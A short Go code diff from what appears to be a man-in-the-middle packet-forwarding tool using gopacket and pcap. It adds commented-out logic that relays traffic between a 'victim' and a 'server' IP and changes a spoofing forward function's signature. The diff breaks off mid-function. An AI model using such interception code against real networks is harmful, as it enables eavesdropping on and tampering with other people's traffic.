@@ -1,9 +1,7 @@
 package main
 
 import (
-	"context"
 	"net"
-	"time"
 
 	"github.com/google/gopacket"
 	"github.com/google/gopacket/layers"
@@ -19,7 +17,24 @@ func createForwardingHandle(nameOfdevice string) *pcap.Handle {
 	return handle
 }
 
-func forwardPacket(handle *pcap.Handle, ip_to_usurpate net.IP, my_mac net.HardwareAddr, ip_target net.IP, mac_target net.HardwareAddr) error {
+// func handleWayForPacket(handle *pcap.Handle, packet gopacket.Packet, global *global) bool {
+// 	if ipLayer := packet.Layer(layers.LayerTypeIPv4); ipLayer != nil {
+// 		ip, _ := ipLayer.(*layers.IPv4)
+// 		if ip.SrcIP == global.victime_ip && ip.DstIP == global.serveur_ip {
+// 			forwardPacket(handle, global.victime_ip, global.victime_mac, global.serveur_ip, global.serveur_mac, packet)
+// 			return true
+// 		}
+//
+// 		if ip.SrcIP == global.serveur_ip && ip.DstIP == global.victime_ip {
+// 			forwardPacket(handle, global.serveur_ip, global.serveur_mac, global.victime_ip, global.victime_mac, packet)
+//
+// 			return true
+// 		}
+// 	}
+// 	return false
+// }
+
+func forwardPacket(handle *pcap.Handle, ip_to_usurpate net.IP, my_mac net.HardwareAddr, ip_target net.IP, mac_target net.HardwareAddr, packet gopacket.Packet) error {
 
 	eth := layers.Ethernet{
 		SrcMAC:       my_mac,
